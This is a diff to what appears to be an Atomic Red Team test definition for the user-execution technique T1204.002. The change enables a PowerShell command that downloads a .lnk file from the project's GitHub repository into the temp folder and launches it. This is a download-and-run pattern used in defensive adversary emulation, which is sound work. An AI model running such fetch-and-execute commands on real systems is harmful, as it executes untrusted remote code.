@@ -397,7 +397,7 @@ atomic_tests:
     - windows
   executor:
     command: |
-      #Invoke-WebRequest -OutFile C:\Users\$env:username\AppData\Local\Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
+      Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
       $file1 = "$env:Temp\test10.lnk"
       Start-Process $file1
       Start-Sleep -s 10
